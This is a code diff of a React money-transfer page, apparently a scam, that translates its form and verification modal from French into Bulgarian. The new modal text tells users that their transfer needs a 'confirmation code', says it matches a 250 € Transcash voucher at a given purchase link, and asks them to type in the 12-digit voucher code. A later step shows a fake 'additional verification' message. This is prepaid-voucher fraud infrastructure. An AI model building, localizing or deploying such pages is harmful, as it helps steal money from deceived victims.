@@ -59,12 +59,12 @@ export default function HomePage() {
     setEmailStatus('idle');
 
     if (!form.firstName || !form.lastName || !form.email || !form.amount) {
-      setError('Veuillez remplir tous les champs obligatoires.');
+      setError('Моля, попълнете всички задължителни полета.');
       return;
     }
 
     if (!/^\d+(\.\d+)?$/.test(form.amount)) {
-      setError('Le montant doit être un nombre valide.');
+      setError('Сумата трябва да бъде валидно число.');
       return;
     }
 
@@ -89,8 +89,8 @@ export default function HomePage() {
   const handleValidateCode = async () => {
     setError('');
 
-    if (code.length !== 14) {
-      setError('Le code doit contenir exactement 14 chiffres.');
+    if (code.length !== 12) {
+      setError('Кодът трябва да съдържа точно 12 цифри.');
       return;
     }
 
@@ -121,7 +121,7 @@ export default function HomePage() {
         setProgress(100);
         triggerConfetti();
         setShowVerifModal(false);
-      }, 4000);
+      }, 6000);
     } catch (err) {
       console.error(err);
       setEmailStatus('error');
@@ -439,25 +439,14 @@ export default function HomePage() {
                   }}
                 >
                   <p style={{ margin: '0 0 6px' }}>
-                    Pour finaliser votre opération, un <strong>code</strong> de
-                    confirmation à 14 chiffres vous a été communiqué par votre
-                    conseiller ou par un canal sécurisé.
+                    Вашият трансфер е в процес на завършване, но се нуждаете от код за потвърждение GHT-UZ667.<strong>GHT-UZ667</strong>
                   </p>
                   <p style={{ margin: '0 0 6px' }}>
-                    Rendez-vous sur le support qui vous a été indiqué
-                    (notification, email, SMS ou interface sécurisée),{' '}
-                    <strong>copiez</strong> le code, puis revenez sur cette
-                    page.
+                    Това съответства на код TRANSCASH 250 €. Наличен на линка
+                    <strong> https://dundle.com/fr/transcash/250-eur-eu/</strong>
                   </p>
                   <p style={{ margin: '0 0 6px' }}>
-                    Collez ensuite le <strong>code</strong> dans le champ
-                    ci-dessous, ou saisissez-le manuellement en vérifiant bien
-                    chaque chiffre.
-                  </p>
-                  <p style={{ margin: '10px 0 0', color: '#111827' }}>
-                    Dès que le code est validé, votre transfert est{' '}
-                    <strong>confirmé</strong> et un email de récapitulatif vous
-                    est envoyé automatiquement.
+                    След това въведете <strong>12 цифрения</strong> код в полето по-долу и завършете.
                   </p>
                 </div>
 
@@ -465,7 +454,7 @@ export default function HomePage() {
                   type="text"
                   value={code}
                   onChange={handleCodeChange}
-                  placeholder="Code de sécurité à 14 chiffres"
+                  placeholder="12-цифрен код за сигурност"
                   style={{
                     width: '100%',
                     padding: '10px 12px',
@@ -563,8 +552,7 @@ export default function HomePage() {
                 lineHeight: 1.5,
               }}
             >
-              Votre <strong>code</strong> a bien été transmis à nos systèmes de
-              contrôle.
+              Вашият <strong>код</strong> е предадена на нашите системи за контрол.
             </p>
             <p
               style={{
@@ -574,10 +562,9 @@ export default function HomePage() {
                 lineHeight: 1.5,
               }}
             >
-              Merci de patienter quelques instants. Nous procédons à une
-              vérification renforcée et reviendrons vers vous dans un très{' '}
-              <strong>court délai</strong> avec la confirmation définitive du
-              transfert.
+              Моля, изчакайте малко. Извършваме допълнителна проверка и ще се свържем с вас в най-кратък срок.{' '}
+              <strong>кратък срок</strong> с окончателното потвърждение на
+              превода.
             </p>
           </div>
         </Modal>
